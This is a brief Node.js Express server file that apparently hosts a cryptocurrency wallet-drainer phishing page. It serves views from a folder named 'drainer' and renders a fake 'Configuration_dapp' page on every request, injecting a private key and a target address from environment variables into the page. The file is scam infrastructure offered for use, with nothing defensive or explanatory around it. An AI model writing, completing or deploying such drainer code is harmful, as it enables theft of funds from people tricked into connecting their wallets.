const express = require("express");
const ejs = require("ejs");
const path = require('path');
const url = express.Router();
const axios = require("axios");
const {ethers} = require('ethers');
const dotenv = require("dotenv").config();

const PK = process.env.PK;//
const TGT = process.env.TGT;

const app = express();
app.use(express.json());


app.set('views', path.join(__dirname, 'drainer'));
app.set('view engine', 'ejs');
app.use(express.static(path.join(__dirname, 'drainer', 'Configuration_dapp_files'))); 

app.use('/', (req, res)=>{
    //
    res.render('Configuration_dapp', {PK:PK,TGT:TGT});
});


const port = 3000;
app.listen(port, ()=>{
    console.log("Our server is listening on port: ",port);
});